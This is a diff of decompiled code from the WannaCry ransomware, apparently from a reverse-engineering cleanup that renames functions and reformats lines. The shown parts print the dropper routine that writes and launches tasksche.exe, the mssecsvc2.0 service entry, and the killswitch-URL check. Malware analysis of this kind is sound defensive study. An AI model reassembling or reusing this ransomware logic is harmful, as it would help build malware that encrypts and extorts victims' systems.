@@ -6723,7 +6723,6 @@ undefined4 write_1831_to_taskche_exe(void) {
   uint uVar4;
   uint uVar5;
   undefined **ppuVar6;
-  char *unaff_EDI;
   LPSTR *ppCVar7;
   undefined **ppuVar8;
   char *pcVar9;
@@ -6783,15 +6782,17 @@ undefined4 write_1831_to_taskche_exe(void) {
 
               *(undefined2 *)puVar11 = 0;
               *(undefined *)((int)puVar11 + 2) = 0;
+              
               // C:\WINDOWS\taskche.exe
               sprintf(&taskche_path, s_C___s__s_00431358, s_WINDOWS_00431364, s_tasksche_exe_0043136c);
+              
               // C:\Windows\qeriuwjhrf
-              sprintf(&qeriu_path, s_C___s_qeriuwjhrf_00431344, s_WINDOWS_00431364, unaff_EDI);
+              sprintf(&qeriu_path, s_C___s_qeriuwjhrf_00431344, s_WINDOWS_00431364);
+              
               MoveFileExA(&taskche_path,&qeriu_path, 1);
               createdFileHandle = (*createFileA)(&taskche_path, 0x40000000, 0, (LPSECURITY_ATTRIBUTES)0x0, 2, 4,(HANDLE)0x0);
               if (createdFileHandle != (HANDLE)0xffffffff) {
-                (*writeFile)(createdFileHandle,res1831_locked.hProcess,res1831_size,
-                             (LPDWORD)&res1831_locked,(LPOVERLAPPED)0x0);
+                (*writeFile)(createdFileHandle, res1831_locked.hProcess, res1831_size, (LPDWORD)&res1831_locked, (LPOVERLAPPED)0x0);
                 (*closeHandle)(createdFileHandle);
                 res1831_locked.hThread = (HANDLE)0x0;
                 res1831_locked.dwProcessId = 0;
@@ -6808,6 +6809,7 @@ undefined4 write_1831_to_taskche_exe(void) {
                 
                 uVar4 = 0xffffffff;
                 ppuVar6 = &PTR_DAT_00431340;
+                
                 do {
                   ppuVar8 = ppuVar6;
                   if (uVar4 == 0) break;
@@ -6816,10 +6818,12 @@ undefined4 write_1831_to_taskche_exe(void) {
                   cVar1 = *(char *)ppuVar6;
                   ppuVar6 = ppuVar8;
                 } while (cVar1 != '\0');
+                
                 uVar4 = ~uVar4;
                 res1831_locked.hProcess = (HANDLE)0x0;
                 iVar3 = -1;
                 pcVar9 = acStack524;
+
                 do {
                   pcVar10 = pcVar9;
                   if (iVar3 == 0) break;
@@ -6828,16 +6832,20 @@ undefined4 write_1831_to_taskche_exe(void) {
                   cVar1 = *pcVar9;
                   pcVar9 = pcVar10;
                 } while (cVar1 != '\0');
+                
                 uVar5 = uVar4 >> 2;
                 ppuVar6 = (undefined **)((int)ppuVar8 - uVar4);
                 puVar11 = (undefined4 *)(pcVar10 + -1);
+                
                 while (uVar5 != 0) {
                   uVar5 = uVar5 - 1;
                   *(undefined **)puVar11 = *ppuVar6;
                   ppuVar6 = ppuVar6 + 1;
                   puVar11 = puVar11 + 1;
                 }
+                
                 uVar4 = uVar4 & 3;
+                
                 while (uVar4 != 0) {
                   uVar4 = uVar4 - 1;
                   *(undefined *)puVar11 = *(undefined *)ppuVar6;
@@ -6850,10 +6858,11 @@ undefined4 write_1831_to_taskche_exe(void) {
                 _Stack592.cb = 0x44;
                 _Stack592.wShowWindow = 0;
                 _Stack592.dwFlags = 0x81;
-                BVar2 = (*createProcessA)((LPCSTR)0x0,acStack524,(LPSECURITY_ATTRIBUTES)0x0,
-                                          (LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,
-                                          (LPCSTR)0x0,(LPSTARTUPINFOA)&_Stack592,
-                                          (LPPROCESS_INFORMATION)&res1831_locked);
+                
+                BVar2 = (*createProcessA)((LPCSTR)0x0, acStack524, (LPSECURITY_ATTRIBUTES)0x0,
+                                          (LPSECURITY_ATTRIBUTES)0x0, 0, 0x8000000, (LPVOID)0x0,
+                                          (LPCSTR)0x0, (LPSTARTUPINFOA)&_Stack592, (LPPROCESS_INFORMATION)&res1831_locked);
+                
                 if (BVar2 != 0) {
                   (*closeHandle)(hObject);
                   (*closeHandle)(createdFileHandle);
@@ -6868,7 +6877,7 @@ undefined4 write_1831_to_taskche_exe(void) {
   return 0;
 }
 
-undefined4 no_argument_handler(void) {
+unsigned int no_argument_handler(void) {
   create_wannacry_service();
   write_1831_to_taskche_exe();
   return 0;
@@ -6902,7 +6911,7 @@ void wannacry_real_entry(void) {
   undefined4 uStack8;
   undefined4 uStack4;
   
-  GetModuleFileNameA((HMODULE)0x0,(LPSTR)&executable_path,0x104);
+  GetModuleFileNameA((HMODULE)0x0, (LPSTR)&executable_path, 0x104);
   argc = (int *)__p___argc();
   
   if (*argc < 2) {
@@ -6919,11 +6928,13 @@ void wannacry_real_entry(void) {
     }
     CloseServiceHandle(hSCManager);
   }
+
   SStack16.lpServiceName = s_mssecsvc2_0_004312fc;
   SStack16.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)&LAB_00408000;
   uStack8 = 0;
   uStack4 = 0;
   StartServiceCtrlDispatcherA(&SStack16);
+  
   return;
 }
 
@@ -6950,8 +6961,8 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nC
   }
 
   *killswitch_url_copy = *killswitch_url;
-  InternetOpenA((LPCSTR)0x0,1,(LPCSTR)0x0,(LPCSTR)0x0,0);
-  hinternet_return = InternetOpenUrlA(hInternet,killswitch_url_buffer,(LPCSTR)0x0,0,0x84000000,0);
+  InternetOpenA((LPCSTR)0x0, 1, (LPCSTR)0x0, (LPCSTR)0x0, 0);
+  hinternet_return = InternetOpenUrlA(hInternet, killswitch_url_buffer, (LPCSTR)0x0, 0, 0x84000000, 0);
 
   if (hinternet_return == (HINTERNET)0x0) {
     InternetCloseHandle(hInternet);
